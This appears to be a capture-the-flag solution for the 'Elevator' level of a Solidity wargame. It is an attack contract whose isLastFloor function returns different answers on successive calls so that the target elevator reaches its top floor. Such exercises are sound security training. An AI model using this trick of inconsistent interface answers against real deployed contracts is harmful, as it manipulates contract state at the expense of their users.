// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "src/levels/11-Elevator/Elevator.sol";

contract ElevatorAttack is Building {
    Elevator elevator;

    constructor(address _elevatorContractAddress) public {
        elevator = Elevator(_elevatorContractAddress);
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (elevator.floor() == 0) {
            return false;
        } else {
            return true;
        }
    }

    function goToTopFloor() public {
        elevator.goTo(100);
    }
}
